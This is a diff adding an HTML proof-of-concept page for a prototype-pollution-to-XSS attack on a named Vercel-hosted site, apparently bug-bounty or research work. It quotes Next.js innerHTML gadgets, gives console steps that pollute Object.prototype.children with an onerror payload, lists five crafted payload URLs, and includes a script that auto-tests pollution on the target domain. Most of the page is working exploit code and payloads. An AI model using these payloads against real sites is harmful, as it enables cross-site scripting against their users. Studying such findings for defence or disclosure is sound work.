@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Prototype Pollution to XSS PoC - Sturdy Octo</title>
+    <style>
+        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
+        .success { color: #00ff00; font-weight: bold; }
+        .fail { color: #ff0000; }
+        .info { color: #00ffff; }
+        pre { background: #000; padding: 10px; border: 1px solid #333; overflow-x: auto; }
+    </style>
+</head>
+<body>
+    <h1>Prototype Pollution to XSS PoC</h1>
+    <h2>Target: sturdy-octo-memory-three.vercel.app</h2>
+    
+    <div id="status"></div>
+    
+    <h3>Attack Vector:</h3>
+    <pre>
+    // Next.js innerHTML gadget found in chunk 117:
+    // if(r)for(let e in r)"children"!==e&&o.setAttribute(e,r[e]);
+    // n?(o.src=n,o.onload=()=>e(),o.onerror=t):r&&(o.innerHTML=r.children,setTimeout(e))
+    
+    // If we pollute Object.prototype.children, any script element created
+    // without a src attribute will have its innerHTML set to our payload!
+    </pre>
+    
+    <h3>Payload URLs:</h3>
+    <pre id="payloads"></pre>
+    
+    <h3>Manual Test Instructions:</h3>
+    <ol>
+        <li>Open the target site in a new tab: <a href="https://sturdy-octo-memory-three.vercel.app" target="_blank">https://sturdy-octo-memory-three.vercel.app</a></li>
+        <li>Open Browser DevTools (F12)</li>
+        <li>Go to Console tab</li>
+        <li>Paste the following code to test if PP works:</li>
+    </ol>
+    <pre>
+    // Test 1: Check if we can pollute the prototype
+    Object.prototype.titan_test = "polluted";
+    let testObj = {};
+    console.log("Test 1 - PP works:", testObj.titan_test === "polluted");
+    
+    // Test 2: Check if 'children' can be polluted
+    Object.prototype.children = "&lt;img/src/onerror=alert('PP_XSS')&gt;";
+    console.log("Test 2 - Children polluted:", Object.prototype.children);
+    
+    // Test 3: The gadget check
+    // If a script element is created without src, innerHTML will be set to our payload
+    </pre>
+    
+    <h3>Expected Result:</h3>
+    <p>If the gadget is exploitable, an alert box with "PP_XSS" should appear when:</p>
+    <ul>
+        <li>A script element is created without a src attribute</li>
+        <li>The script's parent element exists</li>
+        <li>The innerHTML is set to the polluted children value</li>
+    </ul>
+    
+    <h3>Additional Gadgets Found:</h3>
+    <pre>
+    // Gadget 1: innerHTML sink (chunk fd9d1056)
+    // mespaceURI||"innerHTML"in e)e.innerHTML=t;
+    
+    // Gadget 2: dangerouslySetInnerHTML (React)
+    // Multiple references in React internals
+    
+    // Gadget 3: setTimeout sink
+    // Multiple setTimeout calls that could be hijacked
+    </pre>
+    
+    <script>
+        // Display payloads
+        const payloads = document.getElementById('payloads');
+        payloads.innerHTML = `
+    // Payload 1: Basic children pollution
+    https://sturdy-octo-memory-three.vercel.app/?__proto__[children]=<img/src/onerror=alert(1)>
+    
+    // Payload 2: SVG payload
+    https://sturdy-octo-memory-three.vercel.app/?__proto__[children]=<svg/onload=alert(1)>
+    
+    // Payload 3: Script injection
+    https://sturdy-octo-memory-three.vercel.app/?__proto__[children]=<script>alert(1)</script>
+    
+    // Payload 4: Constructor.prototype
+    https://sturdy-octo-memory-three.vercel.app/?constructor[prototype][children]=<img/src/onerror=alert(1)>
+    
+    // Payload 5: Hash fragment (client-side only)
+    https://sturdy-octo-memory-three.vercel.app/#__proto__[children]=<img/src/onerror=alert(1)>
+        `;
+        
+        // Auto-test if opened on target
+        if (window.location.hostname === 'sturdy-octo-memory-three.vercel.app') {
+            document.getElementById('status').innerHTML = '<p class="success">Running auto-test on target...</p>';
+            
+            // Test if PP works
+            Object.prototype.titan_test = "polluted";
+            let testObj = {};
+            
+            if (testObj.titan_test === "polluted") {
+                document.getElementById('status').innerHTML += '<p class="success">✓ Prototype Pollution confirmed!</p>';
+            } else {
+                document.getElementById('status').innerHTML += '<p class="fail">✗ Prototype Pollution not working</p>';
+            }
+        } else {
+            document.getElementById('status').innerHTML = '<p class="info">Open this file on the target domain to auto-test</p>';
+        }
+    </script>
+</body>
+</html>
